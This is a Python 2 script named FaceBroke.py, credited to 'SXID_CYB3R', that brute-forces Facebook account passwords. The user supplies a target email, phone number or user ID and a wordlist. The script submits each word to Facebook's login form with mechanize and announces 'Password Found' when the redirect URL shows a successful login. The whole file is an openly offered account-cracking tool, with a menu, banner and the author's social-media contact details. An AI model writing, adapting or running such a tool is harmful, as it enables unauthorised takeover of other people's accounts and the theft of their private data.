#!/usr/bin/python

''' INFORMASI =---=

Project Number : 03
Project Name : FaceBroke.py

=---= INFORMASI '''

try:
	print ""
	print " [ IMPORTING ] Importing Module : os "
	import os
	print " [ IMPORTING ] Importing Module : datetime"
	import datetime
	print " [ IMPORTING ] Importing Module : time"
	import time
	print " [ IMPORTING ] Importing Module : mechanize"
	import mechanize
	print ""
	pass
except ImportError:
	print ""
	print " [ ERROR ] Error when Importing Modules ! Please check 'requirement.txt'"
	print "           to see what Modules are needed to Operate this Tools..."
	print " [ ERROR ] Maybe You are using Old version of Python...recommended version"
	print "           is Python v2.7 and Up ..."
	exit()

###################################################################################################
### CORE UTAMA =---=

waktu = datetime.datetime.now()
jam = waktu.hour
menit = waktu.minute
detik = waktu.second

error_unknown = " [ ERROR ] Unknown Error has been occured !"
error_blank = " [ ERROR ] Don't Leave it Blank !"
error_inv_num = " [ ERROR ] Invalid Number has been Selected !"

def pro_exit():
	print ""
	print " [ CLOSING ] Thanks for Using My Tools !"
	time.sleep(1)
	print " [ SHUTDOWN ] Closing Tools at {0}:{1}:{2}".format(jam,menit,detik)
	time.sleep(1)
	exit()

def envi_win():
	os.system('cls')
	os.system('mode 86,50')

def envi_linux():
	os.system('clear')

### CORE UTAMA =---=
###################################################################################################

###################################################################################################
### TOOLS =---=

def info_details():
	print ""
	print " # Tools Created by SXID_CYB3R"
	print " # This Tools Script is Original"
	print " # Programming Language : Python 2.7 and Up"
	print " # Tools Created at : June 18th 2018"
	print " # Tools Finished at : June 18th 2018"
	print " # Support and Subs Me on Github : https://github.com/sxidcyber/"
	print " # Follow Me on Instagram : @sx.id_cyb3r"
	print " # Add Me on Facebook : www.facebook.com/profile.php?id=100026574833558"
	print "   $ My Facebook Name is 'Muhammad Rizky'"
	print ""
	jeda = raw_input( " [#] Press 'ENTER' to Close and Exit Tools ...")
	pro_exit()

def tools_facebroke():
	jumlah_percobaan = 0
	print " |"
	print " |--> [ Email, Phone Number, or User ID ]"
	target = raw_input(" |--> $ Target : ")
	if target == "":
		print ""
		print error_blank
		pro_exit()
	print " |"
	print " |--> [ Example : C:\MyFolder\wordlist.txt ]"
	lokasi_wordlist = raw_input(" |--> $ Wordlist Location : ")
	if lokasi_wordlist == "":
		print ""
		print error_blank
		pro_exit()

	print ""
	print " $ Opening Wordlist ..."
	try:
		buka_wordlist = open(lokasi_wordlist,'r')
	except:
		print ""
		print " [ ERROR ] Error when Opening Wordlist, Wordlist File is"
		print "           doesn't Exist or Location is Invalid, check Your"
		print "           Wordlist File or Location and Try Again ..."
		pro_exit()

	print " $ Reading Wordlist and Counting Line..."
	try:
		baca_wordlist = buka_wordlist.readlines()
		banyak_kata = str(len(baca_wordlist))
	except:
		print ""
		print " [ ERROR ] Error when Reading Wordlist ! File Size is too"
		print "           big or not a readable File"
		pro_exit()

	print " $ Connecting Mechanize with Browser and Open URL ..."
	bro = mechanize.Browser()
	bro.set_handle_robots(False)

	print ""
	jeda = raw_input(" [#] Press 'ENTER' to Start Cracking ...")
	print ""

	for password in baca_wordlist:
		try:
			jumlah_percobaan = jumlah_percobaan+1
			print " [{0}/{1}] Trying Password : {2}".format(jumlah_percobaan, banyak_kata, password)
			bro.open('https://www.facebook.com/login.php')
			bro.select_form(nr=0)
			bro.form['email'] = target
			bro.form['pass'] = password
			sub = bro.submit()
			hasil = sub.geturl()
			if hasil == 'https://www.facebook.com/login.php?login_attempt=1&lwv=100':
				pass
			elif hasil == 'https://www.facebook.com/':
				print ""
				print " $ Password Found !!! : {}".format(password)
				print ""
				jeda = raw_input(" [#] Press 'ENTER' to Close and Exit Tools ...")
				pro_exit()
			elif hasil == 'https://www.facebook.com/friends/requests/?fcref=rup':
				print ""
				print " $ Password Found !!! : {}".format(password)
				print ""
				jeda = raw_input(" [#] Press 'ENTER' to Close and Exit Tools ...")
				pro_exit()
			else:
				pass
		except:
			print ""
			print error_unknown
			pro_exit()

def banner():
	command_os
	print """
######################################################################################

    8888888888                        888888b.                   888               
    888                               888  "88b                  888               
    888                               888  .88P                  888               
    8888888  8888b.   .d8888b .d88b.  8888888K.  888d888 .d88b.  888  888  .d88b.  
    888         "88b d88P"   d8P  Y8b 888  "Y88b 888P"  d88""88b 888 .88P d8P  Y8b
    888     .d888888 888     88888888 888    888 888    888  888 888888K  88888888 
    888     888  888 Y88b.   Y8b.     888   d88P 888    Y88..88P 888 "88b Y8b.     
    888     "Y888888  "Y8888P "Y8888  8888888P"  888     "Y88P"  888  888  "Y8888

             ---={ FaceBroke.py +++ Created and Coded by SXID_CYB3R }=---            
                          ---={ Greetz : ./Mr.L0V3_404 }=---

######################################################################################
 [#] Type 'start' to Start Cracking Password
 [#] Type 'info' to see Information and Details
 [#] Type 'exit' to Close and Exit the Tools

######################################################################################"""

	tanya_option = raw_input(" tools@option:-# ")
	if tanya_option == "info":
		info_details()
	elif tanya_option == "start":
		tools_facebroke()
	elif tanya_option == "exit":
		pro_exit()
	else:
		print ""
		print error_unknown
		pro_exit()

### TOOLS =---=
###################################################################################################

### INTERFACE PERTAMA =---=
###################################################################################################

print " [#] Select Your Command Line !"
print ""
print " {1}--Terminal --------> Linux and Other"
print " {2}--Command Prompt --> Windows"
print ""
sel_jenis_os = raw_input(" tools@select_os:-# ")
if sel_jenis_os == "":
	print ""
	print error_blank
	pro_exit()
elif sel_jenis_os == "1":
	command_os = envi_linux()
elif sel_jenis_os == "2":
	command_os = envi_win()
else:
	print ""
	print error_inv_num
	pro_exit()

banner()